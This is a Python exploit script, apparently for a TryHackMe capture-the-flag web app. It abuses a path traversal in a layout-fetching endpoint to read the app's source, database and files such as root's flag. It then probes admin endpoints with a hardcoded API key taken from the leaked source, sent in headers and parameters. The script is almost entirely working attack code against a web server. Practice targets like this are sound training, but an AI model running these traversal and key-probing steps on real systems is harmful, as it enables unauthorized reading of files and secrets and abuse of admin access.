import requests, re, random, string

BASE = "http://10.112.165.127:5000"

s = requests.Session()
uname = "loot_" + "".join(random.choices(string.ascii_lowercase, k=4))
s.post(f"{BASE}/register", data={"username": uname, "password": "T1234!"}, allow_redirects=False)
s.post(f"{BASE}/login", data={"username": uname, "password": "T1234!"}, allow_redirects=False)

FLAG_RE = re.compile(r"THM\{[^}]+\}")

# 1) Read full app.py
print("=" * 60)
print("=== FULL app.py SOURCE CODE ===")
print("=" * 60)
r = s.get(f"{BASE}/api/fetch_layout?layout=../../app.py")
print(r.text)

# Collect flags
for f in FLAG_RE.findall(r.text):
    print(f"\n[FLAG] {f}")

# 2) Search for flag files
print("\n" + "=" * 60)
print("=== Searching for flags ===")
print("=" * 60)
paths = [
    "../../flag.txt",
    "../../FLAG",
    "../../flag",
    "../../cupid.db",
    "../../seeder.py",
    "../../requirements.txt",
    "../../../../root/flag.txt",
    "../../../../home/flag.txt",
    "../../../../tmp/flag.txt",
    "../../../../opt/flag.txt",
    "../../../../var/www/flag.txt",
    "../../static/flag.txt",
    "../flag.html",
    "../../secret.txt",
    "../../admin_flag.txt",
]

for p in paths:
    r = s.get(f"{BASE}/api/fetch_layout?layout={p}", timeout=5)
    if r.status_code == 200 and "No such file" not in r.text and "Error" not in r.text and len(r.text) > 5:
        print(f"\n  [{p}] ({len(r.text)} bytes):")
        print(r.text[:2000])
        for f in FLAG_RE.findall(r.text):
            print(f"\n[FLAG] {f}")

# 3) Try admin API key we found
print("\n" + "=" * 60)
print("=== Testing ADMIN_API_KEY ===")
print("=" * 60)
API_KEY = "CUPID_MASTER_KEY_2024_XOXO"

for endpoint in ["/admin", "/api/admin", "/api/flag", "/api/users",
                 "/api/admin/flag", "/api/admin/users", "/admin/flag",
                 "/admin/dashboard", "/api/secret"]:
    for method in ["GET", "POST"]:
        for key_loc in ["header", "param"]:
            if key_loc == "header":
                r = s.request(method, f"{BASE}{endpoint}",
                             headers={"X-API-Key": API_KEY, "Authorization": f"Bearer {API_KEY}"},
                             timeout=5)
            else:
                r = s.request(method, f"{BASE}{endpoint}",
                             params={"api_key": API_KEY, "key": API_KEY},
                             timeout=5)
            if r.status_code != 404 and len(r.text) > 20:
                content = r.text[:200].replace("\n", " ")
                print(f"  {method} {endpoint} ({key_loc}) -> {r.status_code}: {content}")
                for f in FLAG_RE.findall(r.text):
                    print(f"\n[FLAG] {f}")
                break
        else:
            continue
        break
